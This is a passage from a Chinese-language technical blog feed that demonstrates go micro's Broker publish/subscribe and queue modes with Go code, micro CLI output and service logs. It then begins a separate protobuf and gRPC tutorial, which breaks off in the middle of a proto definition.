micro框架中，Broker服务就是用于支持发布订阅模式（pub/sub）。发布订阅模式，我们一般使用消息队列作为中间件实现异步通信，从而做到系统解耦、削峰稳流。在go micro框架中，Broker就是负责消息队列这个功能，消息生产者负责生产消息，推送给Broker，消息消费者server向Broker订阅指定类型的消息（我们称为topic），即Broker注册自己的消息处理，一旦有消息到来，则调用响应的消息处理逻辑。Micro的Broker默认使用了Nats作为消息队列，同时他也支持业界常用的消息队列，比如Kafka,RabbitMQ等，因此我们可以根据我们的需求选择消息队列组件作为Broker的底层支持。</p><p>Micro内置的Pub/Sub模式很简单易用，用户只需要定义好publisher, subscriber以及消息内容，其他工作都将由框架实现。这里给出micor pub/sub的实践案例。</p><p>Broker、publisher、subscriber三者通信的消息结构体为Message，Message结构体的定义如下。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> Message <span class="keyword">struct</span> &#123;</span><br><span class="line">Header <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span></span><br><span class="line">Body   []<span class="keyword">byte</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消息订阅者的实现消息订阅如下：</p><ol><li>subscrber先连接上broker，broker.Connect()</li><li>对指定的topic进行注册，broker.Subscribe。特殊地，如果是点对点通信，那需要在，broker.Subscribe的第三个参数加上broker.Queue(topic)。如果是发布订阅模式则不需要。</li><li>实现消息处理函数，传入broker.Subscribe第二个参数。<figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/micro/micro/v3/service&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/micro/micro/v3/service/logger&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/micro/go-micro/broker&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> topic1 = <span class="string">&quot;topic1&quot;</span></span><br><span class="line"><span class="keyword">var</span> topic2 = <span class="string">&quot;topic2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleEvent</span><span class="params">(b broker.Event)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">msg := <span class="keyword">string</span>(b.Message().Body)</span><br><span class="line">logger.Infof(<span class="string">&quot;[sub] recieve message: %s, header: %s\n&quot;</span>, msg, b.Message().Header)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点对点消息通信，消息不会复制，只会被一个消费者消费</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">subTopicQ</span><span class="params">(topic <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">_, err := broker.Subscribe(topic, handleEvent, broker.Queue(topic))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发布订阅模式消息通信，消息会复制，可以被多个消费者消费</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">subTopic</span><span class="params">(topic <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line">_, err := broker.Subscribe(topic, handleEvent)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">fmt.Println(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Create service</span></span><br><span class="line">srv := service.New(</span><br><span class="line">service.Name(<span class="string">&quot;hellosubscriber&quot;</span>),</span><br><span class="line">service.Version(<span class="string">&quot;latest&quot;</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">srv.Init()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := broker.Connect(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Error(<span class="string">&quot;Broker Connect error: &quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">subTopic(topic1)</span><br><span class="line">subTopicQ(topic2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run service</span></span><br><span class="line"><span class="keyword">if</span> err := srv.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><p>消息发布的实现消息发布的步骤如下：</p><ol><li>publisher先连接上broker，broker.Connect()</li><li>broker.Publish(topic, msg) 直接对指定topic发送消息。</li></ol><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/micro/micro/v3/service&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/micro/micro/v3/service/logger&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/micro/go-micro/broker&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/pborman/uuid&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> topic1 = <span class="string">&quot;topic1&quot;</span></span><br><span class="line"><span class="keyword">var</span> topic2 = <span class="string">&quot;topic2&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">handleEvent</span><span class="params">(b broker.Event)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">msg := <span class="keyword">string</span>(b.Message().Body)</span><br><span class="line">logger.Infof(<span class="string">&quot;[sub] recieve message: %s, header: %s\n&quot;</span>, msg, b.Message().Header)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 发布消息</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pubTopic</span><span class="params">(topic <span class="keyword">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">range</span> time.Tick(time.Second) &#123;</span><br><span class="line">msg := &amp;broker.Message &#123;</span><br><span class="line">Header: <span class="keyword">map</span>[<span class="keyword">string</span>]<span class="keyword">string</span> &#123;</span><br><span class="line"><span class="string">&quot;id&quot;</span>: uuid.NewUUID().String(),</span><br><span class="line">&#125;,</span><br><span class="line">Body: []<span class="keyword">byte</span>(fmt.Sprintf(<span class="string">&quot;Messaging you all day on %s&quot;</span>, topic)),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> err := broker.Publish(topic, msg); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Error(<span class="string">&quot;Broker Publish error: &quot;</span>, err)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">logger.Infof(<span class="string">&quot;Broker Publish topic:%s msg: %s&quot;</span>, topic, msg)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="comment">// Create service</span></span><br><span class="line">srv := service.New(</span><br><span class="line">service.Name(<span class="string">&quot;hellopublisher&quot;</span>),</span><br><span class="line">service.Version(<span class="string">&quot;latest&quot;</span>),</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">srv.Init()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> err := broker.Connect(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        logger.Error(<span class="string">&quot;Broker Connect error: &quot;</span>, err)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> pubTopic(topic1)</span><br><span class="line"><span class="keyword">go</span> pubTopic(topic2)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Run service</span></span><br><span class="line"><span class="keyword">if</span> err := srv.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">logger.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>实践过程：</p><ol><li>订阅服务，我起了两个，命名为sub1,sub2</li><li>发布服务，我起了pub，pub里两个协程向topic1和topic2发送消息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">micro run --name sub1 .</span><br><span class="line">micro run --name sub2 .</span><br><span class="line">micro run --name pub .</span><br><span class="line"></span><br><span class="line">unshideMacBook-Pro:hellosubcriber junshili$ micro status </span><br><span class="line">NAMEVERSIONSOURCESTATUSBUILDUPDATEDMETADATA</span><br><span class="line">publatest&#x2F;Users&#x2F;junshili&#x2F;hellopublisherrunningn&#x2F;a1m48s agoowner&#x3D;admin, group&#x3D;micro</span><br><span class="line">sub1latest&#x2F;Users&#x2F;junshili&#x2F;hellosubcriberrunningn&#x2F;a13s agoowner&#x3D;admin, group&#x3D;micro</span><br><span class="line">sub2latest&#x2F;Users&#x2F;junshili&#x2F;hellosubcriberrunningn&#x2F;a6s agoowner&#x3D;admin, group&#x3D;micro</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">junshideMacBook-Pro:hellosubcriber junshili$ micro stats --all custom</span><br><span class="line">SERVICE    hellopublisher</span><br><span class="line"></span><br><span class="line">VERSION    latest</span><br><span class="line"></span><br><span class="line">NODE                                                   ADDRESS:PORT           STARTED            UPTIME    MEMORY    THREADS    GC</span><br><span class="line">hellopublisher-a5c3156e-cb26-40af-b899-092195a49fd4    192.168.1.101:54250    May 13 00:46:28    2m5s      2.88mb    43         10.670273ms</span><br><span class="line"></span><br><span class="line">SERVICE    hellosubscriber</span><br><span class="line"></span><br><span class="line">VERSION    latest</span><br><span class="line"></span><br><span class="line">NODE                                                    ADDRESS:PORT           STARTED            UPTIME    MEMORY    THREADS    GC</span><br><span class="line">hellosubscriber-7035f6b4-ebd8-4dbf-bb10-eb49cf7ca34c    192.168.1.101:54578    May 13 00:48:13    21s       2.54mb    33         114.399µs</span><br><span class="line"></span><br><span class="line">hellosubscriber-aa456e83-c035-43dc-9a71-a459c2c058c3    192.168.1.101:54572    May 13 00:48:13    21s    2.63mb    33    121.528µs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们使用<code>micro logs -f helloworld</code> 或者 <code>micro logs helloworld</code>查看服务输出的日志。</p><p>先观察pub服务的日志，pub在向发送topic1和topic2消息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2021-05-13 00:46:29  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic2 msg: &amp;&#123;map[id:99b30102-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2&#125;</span><br><span class="line">2021-05-13 00:46:29  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic1 msg: &amp;&#123;map[id:99b30184-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1&#125;</span><br><span class="line">2021-05-13 00:46:30  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic2 msg: &amp;&#123;map[id:9a4af598-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2&#125;</span><br><span class="line">2021-05-13 00:46:30  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic1 msg: &amp;&#123;map[id:9a4af692-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1&#125;</span><br><span class="line">2021-05-13 00:46:31  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic1 msg: &amp;&#123;map[id:9ae409d6-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1&#125;</span><br><span class="line">2021-05-13 00:46:31  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic2 msg: &amp;&#123;map[id:9ae40ae4-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2&#125;</span><br><span class="line">2021-05-13 00:46:32  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic2 msg: &amp;&#123;map[id:9b7ca894-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2&#125;</span><br><span class="line">2021-05-13 00:46:32  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic1 msg: &amp;&#123;map[id:9b7ca7ea-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1&#125;</span><br><span class="line">2021-05-13 00:46:33  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic1 msg: &amp;&#123;map[id:9c152dc6-b341-11eb-b5c8-acde48001122] Messaging you all day on topic1&#125;</span><br><span class="line">2021-05-13 00:46:33  file&#x3D;blob-940620946&#x2F;main.go:34 level&#x3D;info Broker Publish topic:topic2 msg: &amp;&#123;map[id:9c152a88-b341-11eb-b5c8-acde48001122] Messaging you all day on topic2&#125;</span><br></pre></td></tr></table></figure><p>观察sub1的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">2021-05-13 00:50:14  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:1fcede3c-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:14  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:1fcedfb8-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:15  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:2067d614-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:15  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:2067d876-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:16  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:20ffd928-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:16  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:20ffd6c6-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:17  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:2198c3d6-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:17  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:2198c2e6-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:18  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:22317f90-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:18  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:22318634-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:19  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:22ca283a-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:19  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:22ca25b0-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:20  file&#x3D;blob-924495561&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:23628e5e-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>观察sub2的日志</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">2021-05-13 00:50:14  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:1fcedfb8-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:15  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:2067d876-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:16  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:20ffd6c6-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:17  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:2198c2e6-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:18  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:22318634-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:19  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:22ca283a-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:20  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:23628d1e-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:20  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:23628e5e-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:21  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:23fb6cc8-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:21  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:23fb6d90-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:22  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic2, header: map[id:24940438-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br><span class="line">2021-05-13 00:50:22  file&#x3D;blob-694627220&#x2F;main.go:15 level&#x3D;info [sub] recieve message: Messaging you all day on topic1, header: map[id:2494015e-b342-11eb-b5c8-acde48001122]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>对比sub1和sub2的日志可以看出，sub1和sub2都能收到topic1的消息，证实topic1可以被多个订阅者消费，符合发布订阅模式。至于topic2，只能被一个消费者消费，不存在一条消息被多个消费者消费的情况，对应的是点对点消息队列通信机制。因此，需要区分这两种通信机制的go micro写法。</p><p>go micro默认的消息队列组件是自己实现的，实际上其实就是一个map，topic是map的key，发布消息时就往map里存，然后broker调度给订阅了该topic的服务推送。生产环境请更换为kafka,rabbitmq这类专用消息队列。</p><p><a href="https://github.com/micro/micro/blob/master/service/broker/memory/memory.go">https://github.com/micro/micro/blob/master/service/broker/memory/memory.go</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> memoryBroker <span class="keyword">struct</span> &#123;</span><br><span class="line">opts broker.Options</span><br><span class="line"></span><br><span class="line">addr <span class="keyword">string</span></span><br><span class="line">sync.RWMutex</span><br><span class="line">connected   <span class="keyword">bool</span></span><br><span class="line">Subscribers <span class="keyword">map</span>[<span class="keyword">string</span>][]*memorySubscriber</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> memorySubscriber <span class="keyword">struct</span> &#123;</span><br><span class="line">id      <span class="keyword">string</span></span><br><span class="line">topic   <span class="keyword">string</span></span><br><span class="line">exit    <span class="keyword">chan</span> <span class="keyword">bool</span></span><br><span class="line">handler broker.Handler</span><br><span class="line">opts    broker.SubscribeOptions</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>go micro broker支持的消息队列在以下链接可以获取：<br><a href="https://github.com/microhq/go-plugins/tree/master/broker">https://github.com/microhq/go-plugins/tree/master/broker</a></p>]]></content>
    
    
    <categories>
      
      <category>技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>go</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Go快速上手—protobuf和gRPC</title>
    <link href="/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94protobuf%E5%92%8CgRPC/"/>
    <url>/2021/05/12/Go%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B%E2%80%94protobuf%E5%92%8CgRPC/</url>
    
    <content type="html"><![CDATA[<p>gRPC是互联网后台常用的RPC框架，而protobuf是一个常用的通信协议，而gRPC中，protobuf常用作其服务间的协议通信，因此很有必要一块掌握这两个技术点。</p><h1 id="protobuf"><a href="#protobuf" class="headerlink" title="protobuf"></a>protobuf</h1><p>protobuf 即 Protocol Buffers，是一种轻便高效的结构化数据存储格式，与语言、平台无关，可扩展可序列化。protobuf 性能和效率大幅度优于 JSON、XML 等其他的结构化数据格式。protobuf 是以二进制方式存储，占用空间小，但也带来了可读性差的缺点（二进制协议，因为不可读而难以调试，不好定位问题）。</p><p>在序列化协议中，JSON，protobuf以及msgpack都是业界常用的协议，我经历的项目都有用到。我经历的团队里，QQ音乐，全民K歌用的是内部开发的JCE协议，只是protobuf换皮的自研协议而已。而梦幻西游微服务使用protobuf作为内部服务通信协议。正因为protobuf的轻量级以及效率极其优秀，因此在众多后台项目中广泛使用。在对外的接口，我们用http协议支持对方的服务调用，而对内的服务间rpc调用，我们倾向于使用protobuf这种轻量级、效率优先的协议。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>macos安装probubuf步骤如下：</p><ul><li>brew install protobuf  // protobuf项目库</li><li>go get -u github.com/golang/protobuf/protoc-gen-go  // 安装protobuf转go的工具</li></ul><p>检查是否安装完成</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">junshideMacBook-Pro:~ junshili$ protoc --version</span><br><span class="line">libprotoc <span class="number">3.13</span><span class="number">.0</span></span><br></pre></td></tr></table></figure><h2 id="协议定义"><a href="#协议定义" class="headerlink" title="协议定义"></a>协议定义</h2><p>protobuf协议定义，这里我们新建一个user.proto协议，里面新增了Student结构体。</p><figure class="highlight protobuf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>; <span class="comment">// 版本声明，使用Protocol Buffers v3版本</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package =<span class="string">&quot;pb/proto_demo&quot;</span>; <span class="comment">//包名</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">message</span> <span class="title">Student</span> </span>&#123;</span><br><span class="line">  <span class="built_in">string</span> name = <span class="number">1</span>;</span><br><span class="line">  <span class="built_in">bool</span> male = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">repeated</span> <span class="built_in">int32</span> scores = <span class="number">3</span>;</span><br><span class="line">  map&lt;<span class="built_in">string</span>, <span class="built_in">int32</span>&gt; subject = <span class="number">4</span>;</span><br><span 